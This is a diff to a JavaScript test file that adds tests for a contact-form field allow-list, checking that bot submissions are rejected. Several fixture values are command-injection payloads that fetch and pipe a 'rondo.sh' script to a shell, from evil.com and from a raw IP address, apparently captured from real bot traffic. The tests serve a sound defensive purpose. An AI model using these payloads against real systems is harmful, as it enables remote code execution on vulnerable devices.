@@ -1,5 +1,6 @@
 import assert from 'assert';
 import { handleForm } from '../lib/post.js';
+import { parseAllowedFields, validateAllowedFields } from '../lib/validate.js';
 import { getNextEmail, setupMailDev } from './setupMailDev.js';
 import http from 'http';
 
@@ -181,5 +182,141 @@ describe('handleForm', function () {
     assert.ok(receivedHeaders, 'Headers should be defined');
     assert.strictEqual(receivedHeaders.authorization, 'test', 'Headers should match');
 
+  });
+});
+
+describe('validateAllowedFields', function () {
+
+  it('should pass when no allowedFields is configured', function () {
+    const result = validateAllowedFields({ mac: ';wget ...' }, {});
+    assert.strictEqual(result.valid, true);
+  });
+
+  it('should pass a valid form with global allowedFields', function () {
+    const result = validateAllowedFields(
+      { name: 'Robert', email: 'r@test.com', message: 'hello' },
+      { allowedFields: ['name', 'email', 'message'] }
+    );
+    assert.strictEqual(result.valid, true);
+  });
+
+  it('should reject a bot form with unknown fields (global allowedFields)', function () {
+    const result = validateAllowedFields(
+      { mac: ';wget -qO- http://evil.com/rondo.sh|sh&#' },
+      { allowedFields: ['name', 'email', 'message'] }
+    );
+    assert.strictEqual(result.valid, false);
+    assert.ok(result.errors[0].includes('mac'));
+  });
+
+  it('should reject a bot form with foreign fields (global allowedFields)', function () {
+    const fields = {
+      submit_button: '',
+      change_action: '',
+      action: '',
+      commit: '0',
+      ttcp_num: '2',
+      ttcp_size: '2',
+      ttcp_ip: '-h `busybox wget -qO- http://evil.com/rondo.sh|sh`',
+      StartEPI: '1',
+    };
+    const result = validateAllowedFields(fields, { allowedFields: ['name', 'email', 'message'] });
+    assert.strictEqual(result.valid, false);
+  });
+
+  it('should pass a valid form with per-token allowedFields (string)', function () {
+    const result = validateAllowedFields(
+      { name: 'Robert', company: 'google', email: 'r@test.com', message: 'hi', submit: '', token: 'TBEoZo2EfdVFhak5', thanks: 'https://example.com/thanks/' },
+      {
+        allowedFields: 'TBEoZo2EfdVFhak5:name,company,email,message,submit',
+        tokenField: 'token',
+        thanksField: 'thanks',
+        siteField: 'site',
+        honeyField: 'email2',
+      }
+    );
+    assert.strictEqual(result.valid, true);
+  });
+
+  it('should reject a bot form with per-token allowedFields (string)', function () {
+    const result = validateAllowedFields(
+      { mac: ';wget ...', token: 'TBEoZo2EfdVFhak5' },
+      {
+        allowedFields: 'TBEoZo2EfdVFhak5:name,company,email,message,submit',
+        tokenField: 'token',
+        thanksField: 'thanks',
+        siteField: 'site',
+        honeyField: 'email2',
+      }
+    );
+    assert.strictEqual(result.valid, false);
+    assert.ok(result.errors[0].includes('mac'));
+  });
+
+  it('should reject when token has no configured allowed list', function () {
+    const result = validateAllowedFields(
+      { name: 'test', token: 'UNKNOWN_TOKEN' },
+      {
+        allowedFields: 'TBEoZo2EfdVFhak5:name,email',
+        tokenField: 'token',
+      }
+    );
+    assert.strictEqual(result.valid, false);
+  });
+});
+
+describe('parseAllowedFields', function () {
+
+  it('should parse a global comma-separated list', function () {
+    const result = parseAllowedFields('name,email,message,submit');
+    assert.deepStrictEqual(result, ['name', 'email', 'message', 'submit']);
+  });
+
+  it('should parse a per-token semicolon-separated map', function () {
+    const result = parseAllowedFields('TOKEN1:name,email;TOKEN2:name,phone,email');
+    assert.deepStrictEqual(result, {
+      TOKEN1: ['name', 'email'],
+      TOKEN2: ['name', 'phone', 'email'],
+    });
+  });
+});
+
+describe('handleForm with allowedFields', function () {
+  const smtpPort = 1025;
+  let maildev;
+  before(async function () {
+    maildev = await setupMailDev({ smtp: smtpPort, web: 1080 });
+  });
+  after(function () {
+    maildev.close();
+  });
+
+  it('should NOT send email when bot fields are present', async function () {
+    await handleForm(
+      { mac: ';wget -qO- http://204.10.194.134/rondo.sh|sh&#', time1: '00:00-00:00' },
+      undefined,
+      {
+        mail: { host: 'localhost', port: smtpPort },
+        to: 'admin@test.com',
+        allowedFields: ['name', 'email', 'message'],
+      }
+    );
+    const received = await getNextEmail();
+    assert.strictEqual(received, undefined, 'No email should be sent for bot form');
+  });
+
+  it('should send email when valid form passes allowedFields check', async function () {
+    await handleForm(
+      { name: 'RobertNAF', company: 'google', email: 'zekisuquc419@gmail.com', message: 'Szia' },
+      'https://example.com',
+      {
+        mail: { host: 'localhost', port: smtpPort },
+        to: 'admin@test.com',
+        allowedFields: ['name', 'company', 'email', 'message'],
+      }
+    );
+    const received = await getNextEmail();
+    assert.ok(received, 'Email should be sent for valid form');
+    assert.ok(received.html.includes('RobertNAF'));
   });
 });
